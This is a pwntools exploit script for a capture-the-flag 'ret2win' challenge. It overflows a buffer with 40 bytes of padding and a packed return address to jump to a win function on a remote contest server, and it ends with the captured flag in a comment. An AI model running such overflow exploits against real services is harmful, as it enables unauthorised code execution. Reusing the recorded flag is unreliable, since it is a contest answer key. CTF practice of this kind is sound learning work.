from pwn import *

# Same syntax as python2
# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']

p = remote('ret2win-pwn.wanictf.org', 9003)
#p = process("./chall")
#p = gdb.debug('./chall')

win = p64(0x401369)

junk = b'A' * 40

p.recvline()
p.sendline(junk + win)

p.recvline()
p.interactive()

# FLAG{f1r57_5739_45_4_9wn3r}
